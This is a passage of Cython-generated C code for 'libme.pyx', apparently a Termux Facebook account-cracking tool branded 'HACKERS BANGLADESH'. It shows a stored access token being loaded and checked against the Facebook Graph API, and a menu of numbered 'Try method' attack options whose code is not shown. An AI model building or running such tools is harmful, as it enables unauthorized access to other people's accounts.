    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    goto __pyx_L8_try_end;
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;

    /* "libme.pyx":363
 * 		try:
 * 			token = open("login.txt","r").read()
 * 		except(KeyError , IOError):             # <<<<<<<<<<<<<<
 * 			os.system("rm -f login.txt")
 * 			self.__login__()
 */
    __pyx_t_7 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_KeyError) || __Pyx_PyErr_ExceptionMatches(__pyx_builtin_IOError);
    if (__pyx_t_7) {
      __Pyx_AddTraceback("libme.James.__menu__file__", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_1, &__pyx_t_2, &__pyx_t_3) < 0) __PYX_ERR(0, 363, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_GOTREF(__pyx_t_3);

      /* "libme.pyx":364
 * 			token = open("login.txt","r").read()
 * 		except(KeyError , IOError):
 * 			os.system("rm -f login.txt")             # <<<<<<<<<<<<<<
 * 			self.__login__()
 * 		try:
 */
      __Pyx_GetModuleGlobalName(__pyx_t_9, __pyx_n_s_os); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 364, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_9);
      __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_9, __pyx_n_s_system); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 364, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __pyx_t_9 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_10))) {
        __pyx_t_9 = PyMethod_GET_SELF(__pyx_t_10);
        if (likely(__pyx_t_9)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
          __Pyx_INCREF(__pyx_t_9);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_10, function);
        }
      }
      __pyx_t_8 = (__pyx_t_9) ? __Pyx_PyObject_Call2Args(__pyx_t_10, __pyx_t_9, __pyx_kp_s_rm_f_login_txt) : __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_kp_s_rm_f_login_txt);
      __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
      if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 364, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

      /* "libme.pyx":365
 * 		except(KeyError , IOError):
 * 			os.system("rm -f login.txt")
 * 			self.__login__()             # <<<<<<<<<<<<<<
 * 		try:
 * 			nama = requests.get("https://graph.facebook.com/me/?access_token="+token).json()["name"].lower()
 */
      __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_login); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 365, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_10);
      __pyx_t_9 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_10))) {
        __pyx_t_9 = PyMethod_GET_SELF(__pyx_t_10);
        if (likely(__pyx_t_9)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
          __Pyx_INCREF(__pyx_t_9);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_10, function);
        }
      }
      __pyx_t_8 = (__pyx_t_9) ? __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_t_9) : __Pyx_PyObject_CallNoArg(__pyx_t_10);
      __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
      if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 365, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      goto __pyx_L4_exception_handled;
    }
    goto __pyx_L5_except_error;
    __pyx_L5_except_error:;

    /* "libme.pyx":361
 * 		print("\n\033[1;92m    _          _          \n\033[1;92m     \        /          \n\033[1;92m    __\______/__ \n\033[1;92m    | [\033[1;31;1m\033[1;92m]  [\033[1;31;1m\033[1;92m] | \n\033[1;92m    |  [\33[1;33m====\033[1;92m]  | [+] HACKERS BANGLADESH [+] \n\033[1;92mo0000o \n\033[1;31;1m \033[1;92m [] \033[1;31;1mAuthor    :  \033[1;92m James404_           \033[1;31;1m  \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  :  \033[1;92m +96598064347        \033[1;31;1m   \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  : \033[1;92m  Black404_           \033[1;31;1m \n\033[1;31;1m \033[1;92m [] \033[1;31;1mGrup Fb   :  \033[1;92m Termux Command World\033[1;31;1m  \n\033[1;31;1m \033[1;92m [] \033[1;31;1mVersion   :  \033[1;92m 0.3                  \033[1;31;1m \n\033[1;92m")
 * 		global token
 * 		try:             # <<<<<<<<<<<<<<
 * 			token = open("login.txt","r").read()
 * 		except(KeyError , IOError):
 */
    __Pyx_XGIVEREF(__pyx_t_4);
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_XGIVEREF(__pyx_t_6);
    __Pyx_ExceptionReset(__pyx_t_4, __pyx_t_5, __pyx_t_6);
    goto __pyx_L1_error;
    __pyx_L4_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_4);
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_XGIVEREF(__pyx_t_6);
    __Pyx_ExceptionReset(__pyx_t_4, __pyx_t_5, __pyx_t_6);
    __pyx_L8_try_end:;
  }

  /* "libme.pyx":366
 * 			os.system("rm -f login.txt")
 * 			self.__login__()
 * 		try:             # <<<<<<<<<<<<<<
 * 			nama = requests.get("https://graph.facebook.com/me/?access_token="+token).json()["name"].lower()
 * 		except IOError:
 */
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_6, &__pyx_t_5, &__pyx_t_4);
    __Pyx_XGOTREF(__pyx_t_6);
    __Pyx_XGOTREF(__pyx_t_5);
    __Pyx_XGOTREF(__pyx_t_4);
    /*try:*/ {

      /* "libme.pyx":367
 * 			self.__login__()
 * 		try:
 * 			nama = requests.get("https://graph.facebook.com/me/?access_token="+token).json()["name"].lower()             # <<<<<<<<<<<<<<
 * 		except IOError:
 * 			os.system("rm -f login.txt")
 */
      __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_requests); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 367, __pyx_L11_error)
      __Pyx_GOTREF(__pyx_t_8);
      __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_get); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 367, __pyx_L11_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_token); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 367, __pyx_L11_error)
      __Pyx_GOTREF(__pyx_t_8);
      __pyx_t_9 = PyNumber_Add(__pyx_kp_s_https_graph_facebook_com_me_acce_2, __pyx_t_8); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 367, __pyx_L11_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_8 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_10))) {
        __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_10);
        if (likely(__pyx_t_8)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
          __Pyx_INCREF(__pyx_t_8);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_10, function);
        }
      }
      __pyx_t_1 = (__pyx_t_8) ? __Pyx_PyObject_Call2Args(__pyx_t_10, __pyx_t_8, __pyx_t_9) : __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_t_9);
      __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 367, __pyx_L11_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_json); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 367, __pyx_L11_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      __pyx_t_1 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_10))) {
        __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_10);
        if (likely(__pyx_t_1)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
          __Pyx_INCREF(__pyx_t_1);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_10, function);
        }
      }
      __pyx_t_2 = (__pyx_t_1) ? __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_t_1) : __Pyx_PyObject_CallNoArg(__pyx_t_10);
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 367, __pyx_L11_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_10 = __Pyx_PyObject_Dict_GetItem(__pyx_t_2, __pyx_n_s_name); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 367, __pyx_L11_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_n_s_lower); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 367, __pyx_L11_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_10 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
        __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_2);
        if (likely(__pyx_t_10)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
          __Pyx_INCREF(__pyx_t_10);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_2, function);
        }
      }
      __pyx_t_3 = (__pyx_t_10) ? __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_10) : __Pyx_PyObject_CallNoArg(__pyx_t_2);
      __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
      if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 367, __pyx_L11_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      __pyx_v_nama = __pyx_t_3;
      __pyx_t_3 = 0;

      /* "libme.pyx":366
 * 			os.system("rm -f login.txt")
 * 			self.__login__()
 * 		try:             # <<<<<<<<<<<<<<
 * 			nama = requests.get("https://graph.facebook.com/me/?access_token="+token).json()["name"].lower()
 * 		except IOError:
 */
    }
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    goto __pyx_L16_try_end;
    __pyx_L11_error:;
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;

    /* "libme.pyx":368
 * 		try:
 * 			nama = requests.get("https://graph.facebook.com/me/?access_token="+token).json()["name"].lower()
 * 		except IOError:             # <<<<<<<<<<<<<<
 * 			os.system("rm -f login.txt")
 * 			exit(" [!] Expired tokens")
 */
    __pyx_t_7 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_IOError);
    if (__pyx_t_7) {
      __Pyx_AddTraceback("libme.James.__menu__file__", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_3, &__pyx_t_2, &__pyx_t_10) < 0) __PYX_ERR(0, 368, __pyx_L13_except_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_GOTREF(__pyx_t_10);

      /* "libme.pyx":369
 * 			nama = requests.get("https://graph.facebook.com/me/?access_token="+token).json()["name"].lower()
 * 		except IOError:
 * 			os.system("rm -f login.txt")             # <<<<<<<<<<<<<<
 * 			exit(" [!] Expired tokens")
 * 		except requests.exceptions.ConnectionError:
 */
      __Pyx_GetModuleGlobalName(__pyx_t_9, __pyx_n_s_os); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 369, __pyx_L13_except_error)
      __Pyx_GOTREF(__pyx_t_9);
      __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_9, __pyx_n_s_system); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 369, __pyx_L13_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __pyx_t_9 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_8))) {
        __pyx_t_9 = PyMethod_GET_SELF(__pyx_t_8);
        if (likely(__pyx_t_9)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
          __Pyx_INCREF(__pyx_t_9);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_8, function);
        }
      }
      __pyx_t_1 = (__pyx_t_9) ? __Pyx_PyObject_Call2Args(__pyx_t_8, __pyx_t_9, __pyx_kp_s_rm_f_login_txt) : __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_kp_s_rm_f_login_txt);
      __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
      if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 369, __pyx_L13_except_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

      /* "libme.pyx":370
 * 		except IOError:
 * 			os.system("rm -f login.txt")
 * 			exit(" [!] Expired tokens")             # <<<<<<<<<<<<<<
 * 		except requests.exceptions.ConnectionError:
 * 			exit(" [!] No internet connection")
 */
      __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_exit, __pyx_tuple__29, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 370, __pyx_L13_except_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
      goto __pyx_L12_exception_handled;
    }

    /* "libme.pyx":371
 * 			os.system("rm -f login.txt")
 * 			exit(" [!] Expired tokens")
 * 		except requests.exceptions.ConnectionError:             # <<<<<<<<<<<<<<
 * 			exit(" [!] No internet connection")
 * 		print("\n  \033[0;97m[1] Try method No - 1 (fast)")
 */
    __Pyx_ErrFetch(&__pyx_t_10, &__pyx_t_2, &__pyx_t_3);
    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_requests); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 371, __pyx_L13_except_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_exceptions); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 371, __pyx_L13_except_error)
    __Pyx_GOTREF(__pyx_t_8);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_ConnectionError); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 371, __pyx_L13_except_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
    __pyx_t_7 = __Pyx_PyErr_GivenExceptionMatches(__pyx_t_10, __pyx_t_1);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_ErrRestore(__pyx_t_10, __pyx_t_2, __pyx_t_3);
    __pyx_t_10 = 0; __pyx_t_2 = 0; __pyx_t_3 = 0;
    if (__pyx_t_7) {
      __Pyx_AddTraceback("libme.James.__menu__file__", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_3, &__pyx_t_2, &__pyx_t_10) < 0) __PYX_ERR(0, 371, __pyx_L13_except_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_GOTREF(__pyx_t_10);

      /* "libme.pyx":372
 * 			exit(" [!] Expired tokens")
 * 		except requests.exceptions.ConnectionError:
 * 			exit(" [!] No internet connection")             # <<<<<<<<<<<<<<
 * 		print("\n  \033[0;97m[1] Try method No - 1 (fast)")
 * 		print("  [2] Try method No - 2 (fast)")
 */
      __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_exit, __pyx_tuple__30, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 372, __pyx_L13_except_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
      goto __pyx_L12_exception_handled;
    }
    goto __pyx_L13_except_error;
    __pyx_L13_except_error:;

    /* "libme.pyx":366
 * 			os.system("rm -f login.txt")
 * 			self.__login__()
 * 		try:             # <<<<<<<<<<<<<<
 * 			nama = requests.get("https://graph.facebook.com/me/?access_token="+token).json()["name"].lower()
 * 		except IOError:
 */
    __Pyx_XGIVEREF(__pyx_t_6);
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_XGIVEREF(__pyx_t_4);
    __Pyx_ExceptionReset(__pyx_t_6, __pyx_t_5, __pyx_t_4);
    goto __pyx_L1_error;
    __pyx_L12_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_6);
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_XGIVEREF(__pyx_t_4);
    __Pyx_ExceptionReset(__pyx_t_6, __pyx_t_5, __pyx_t_4);
    __pyx_L16_try_end:;
  }

  /* "libme.pyx":373
 * 		except requests.exceptions.ConnectionError:
 * 			exit(" [!] No internet connection")
 * 		print("\n  \033[0;97m[1] Try method No - 1 (fast)")             # <<<<<<<<<<<<<<
 * 		print("  [2] Try method No - 2 (fast)")
 * 		print("  [3] Try method No - 3 (fast)")
 */
  if (__Pyx_PrintOne(0, __pyx_kp_s_0_97m_1_Try_method_No_1_fast) < 0) __PYX_ERR(0, 373, __pyx_L1_error)

  /* "libme.pyx":374
 * 			exit(" [!] No internet connection")
 * 		print("\n  \033[0;97m[1] Try method No - 1 (fast)")
 * 		print("  [2] Try method No - 2 (fast)")             # <<<<<<<<<<<<<<
 * 		print("  [3] Try method No - 3 (fast)")
 * 		print("  [0] Exit \033[0;97m[\033[0;93mremove token\033[0;97m]")
 */
  if (__Pyx_PrintOne(0, __pyx_kp_s_2_Try_method_No_2_fast) < 0) __PYX_ERR(0, 374, __pyx_L1_error)

  /* "libme.pyx":375
 * 		print("\n  \033[0;97m[1] Try method No - 1 (fast)")
 * 		print("  [2] Try method No - 2 (fast)")
 * 		print("  [3] Try method No - 3 (fast)")             # <<<<<<<<<<<<<<
 * 		print("  [0] Exit \033[0;97m[\033[0;93mremove token\033[0;97m]")
 * 		james = input("\n  [] Choose Option :  ")
 */
  if (__Pyx_PrintOne(0, __pyx_kp_s_3_Try_method_No_3_fast) < 0) __PYX_ERR(0, 375, __pyx_L1_error)

  /* "libme.pyx":376
 * 		print("  [2] Try method No - 2 (fast)")
 * 		print("  [3] Try method No - 3 (fast)")
 * 		print("  [0] Exit \033[0;97m[\033[0;93mremove token\033[0;97m]")             # <<<<<<<<<<<<<<
 * 		james = input("\n  [] Choose Option :  ")
 * 		if james =="":
 */
  if (__Pyx_PrintOne(0, __pyx_kp_s_0_Exit_0_97m_0_93mremove_token) < 0) __PYX_ERR(0, 376, __pyx_L1_error)

  /* "libme.pyx":377
 * 		print("  [3] Try method No - 3 (fast)")
 * 		print("  [0] Exit \033[0;97m[\033[0;93mremove token\033[0;97m]")
 * 		james = input("\n  [] Choose Option :  ")             # <<<<<<<<<<<<<<
 * 		if james =="":
 * 			self.__menu__file__()
 */
  __pyx_t_10 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__31, NULL); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 377, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_10);
  __pyx_v_james = __pyx_t_10;
  __pyx_t_10 = 0;

  /* "libme.pyx":378
 * 		print("  [0] Exit \033[0;97m[\033[0;93mremove token\033[0;97m]")
 * 		james = input("\n  [] Choose Option :  ")
 * 		if james =="":             # <<<<<<<<<<<<<<
 * 			self.__menu__file__()
 * 		elif james == "1" or james == "01":
 */
  __pyx_t_11 = (__Pyx_PyString_Equals(__pyx_v_james, __pyx_kp_s_, Py_EQ)); if (unlikely(__pyx_t_11 < 0)) __PYX_ERR(0, 378, __pyx_L1_error)
  if (__pyx_t_11) {

    /* "libme.pyx":379
 * 		james = input("\n  [] Choose Option :  ")
 * 		if james =="":
 * 			self.__menu__file__()             # <<<<<<<<<<<<<<
 * 		elif james == "1" or james == "01":
 * 			self.__method__2__()
 */
    __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_menu__file); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 379, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_3 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
      __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
      if (likely(__pyx_t_3)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
        __Pyx_INCREF(__pyx_t_3);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_2, function);
      }
    }
    __pyx_t_10 = (__pyx_t_3) ? __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_3) : __Pyx_PyObject_CallNoArg(__pyx_t_2);
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 379, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_10);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;

    /* "libme.pyx":378
 * 		print("  [0] Exit \033[0;97m[\033[0;93mremove token\033[0;97m]")
 * 		james = input("\n  [] Choose Option :  ")
 * 		if james =="":             # <<<<<<<<<<<<<<
 * 			self.__menu__file__()
 * 		elif james == "1" or james == "01":
 */
    goto __pyx_L21;
  }

  /* "libme.pyx":380
 * 		if james =="":
 * 			self.__menu__file__()
 * 		elif james == "1" or james == "01":             # <<<<<<<<<<<<<<
 * 			self.__method__2__()
 * 		elif james == "2" or james == "02":
 */
  __pyx_t_12 = (__Pyx_PyString_Equals(__pyx_v_james, __pyx_kp_s_1, Py_EQ)); if (unlikely(__pyx_t_12 < 0)) __PYX_ERR(0, 380, __pyx_L1_error)
  if (!__pyx_t_12) {
  } else {
    __pyx_t_11 = __pyx_t_12;
    goto __pyx_L22_bool_binop_done;
  }
  __pyx_t_12 = (__Pyx_PyString_Equals(__pyx_v_james, __pyx_kp_s_01, Py_EQ)); if (unlikely(__pyx_t_12 < 0)) __PYX_ERR(0, 380, __pyx_L1_error)
  __pyx_t_11 = __pyx_t_12;
  __pyx_L22_bool_binop_done:;
  if (__pyx_t_11) {

    /* "libme.pyx":381
 * 			self.__menu__file__()
 * 		elif james == "1" or james == "01":
 * 			self.__method__2__()             # <<<<<<<<<<<<<<
 * 		elif james == "2" or james == "02":
 * 			self.__method__1__()
 */
    __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_method__2); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 381, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_3 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
      __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
      if (likely(__pyx_t_3)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
        __Pyx_INCREF(__pyx_t_3);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_2, function);
      }
    }
    __pyx_t_10 = (__pyx_t_3) ? __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_3) : __Pyx_PyObject_CallNoArg(__pyx_t_2);
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 381, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_10);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;

    /* "libme.pyx":380
 * 		if james =="":
 * 			self.__menu__file__()
 * 		elif james == "1" or james == "01":             # <<<<<<<<<<<<<<
 * 			self.__method__2__()
 * 		elif james == "2" or james == "02":
 */
    goto __pyx_L21;
  }

  /* "libme.pyx":382
 * 		elif james == "1" or james == "01":
 * 			self.__method__2__()
 * 		elif james == "2" or james == "02":             # <<<<<<<<<<<<<<
 * 			self.__method__1__()
 * 		elif james == "3" or james == "03":
 */
  __pyx_t_12 = (__Pyx_PyString_Equals(__pyx_v_james, __pyx_kp_s_2, Py_EQ)); if (unlikely(__pyx_t_12 < 0)) __PYX_ERR(0, 382, __pyx_L1_error)
  if (!__pyx_t_12) {
  } else {
    __pyx_t_11 = __pyx_t_12;
    goto __pyx_L24_bool_binop_done;
  }
  __pyx_t_12 = (__Pyx_PyString_Equals(__pyx_v_james, __pyx_kp_s_02, Py_EQ)); if (unlikely(__pyx_t_12 < 0)) __PYX_ERR(0, 382, __pyx_L1_error)
  __pyx_t_11 = __pyx_t_12;
  __pyx_L24_bool_binop_done:;
  if (__pyx_t_11) {

    /* "libme.pyx":383
 * 			self.__method__2__()
 * 		elif james == "2" or james == "02":
 * 			self.__method__1__()             # <<<<<<<<<<<<<<
 * 		elif james == "3" or james == "03":
 * 			self.__33__3__()
 */
    __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_method__1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 383, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_3 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
      __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
      if (likely(__pyx_t_3)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
        __Pyx_INCREF(__pyx_t_3);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_2, function);
      }
    }
    __pyx_t_10 = (__pyx_t_3) ? __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_3) : __Pyx_PyObject_CallNoArg(__pyx_t_2);
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 383, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_10);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;

    /* "libme.pyx":382
 * 		elif james == "1" or james == "01":
 * 			self.__method__2__()
 * 		elif james == "2" or james == "02":             # <<<<<<<<<<<<<<
 * 			self.__method__1__()
 * 		elif james == "3" or james == "03":
 */
    goto __pyx_L21;
  }

  /* "libme.pyx":384
 * 		elif james == "2" or james == "02":
 * 			self.__method__1__()
 * 		elif james == "3" or james == "03":             # <<<<<<<<<<<<<<
